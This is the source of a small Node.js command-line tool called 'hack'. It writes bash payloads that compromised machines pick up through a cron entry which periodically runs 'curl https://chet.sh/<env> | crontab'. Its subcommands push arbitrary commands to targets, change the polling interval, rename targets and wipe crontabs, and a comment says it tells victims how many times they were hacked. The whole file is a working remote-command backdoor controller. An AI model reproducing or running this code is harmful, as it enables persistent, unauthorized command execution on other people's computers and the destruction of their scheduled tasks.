#! /usr/bin/env node

const shell = require('shelljs')

const i = process.argv.indexOf('/usr/local/bin/hack')
const env = process.argv[i+1]
const cmd = process.argv[i+2]
const args = process.argv.slice(i+3)

hack(env, cmd, args)


function hack(env, cmd, args) {

  if (env === 'help') {
    help()

  } else if (cmd === 'exec') {
    // `hack live exec "say hello world"`
    write(env, args[0])

  } else if (cmd == 'reset') {
    // `hack live reset`
     write(env, [
      'crontab -r',
      'echo "* * * * * curl https://chet.sh/' + env + ' | crontab"',
    ].join('\n'))

  } else if (cmd === 'interval') {
    // `hack live interval 1d`
    var freq

    if (args[0] === '1m') {
      freq = "* * * * *"
    } else if (args[0] === '1h') {
      freq = "0 * * * *"
    } else if (args[0] === '1d') {
      freq = "0 0 * * *"
    } else if (args[0] === '1M') {
      freq = "0 0 0 * *"
    } else if (args[0] === '1y') {
      freq = "0 0 0 0 *"
    } else if (args[0] === '1w') {
      freq = "0 0 * * 0"
    } else {
      throw new Error('Unknown interval', args[0])
    }

    write(env, [
      'crontab -r',
      'echo "' + freq + ' curl https://chet.sh/' + env + ' | crontab"',
    ].join('\n'))

  } else if (cmd === 'cron') {
    // `hack live cron "20 16 * * * say 'its 4 20!'"`
    write(env, "echo " + JSON.stringify(args[0]) + " | crontab")

  } else if (cmd === 'forget') {
    // `hack live forget`
    write(env, "crontab -r")

  } else if (cmd === 'rename') {
    // `hack live rename jon`
    const newEnv = args[0]

    write(env, [
      "crontab -r",
      'echo "* * * * * curl https://chet.sh/' + newEnv + ' | crontab"',
    ].join('\n'))

    write(newEnv, '')

  } else {
    help()
  }
}

function write(env, cmd) {
  // lets them know when and how many times they were hacked
  const id = Date.now().toString()

  const text = [
    "#!/usr/bin/env bash",
    "",
    "if [[ ! -e /tmp/hack." + id + " ]]; then",
    cmd,
    "touch /tmp/hack." + id,
    "fi",
  ].join('\n')

  if (!shell.test('-e', env)) {
    shell.touch(env)
  }
  shell.exec('echo ' + JSON.stringify(text) + ' > ' + env)
  // shell.echo(text).to(env)
}


function help() {
  console.log('hack v' + require('../package.json').version)
  console.log('usage: hack <env> <cmd> [args]')
}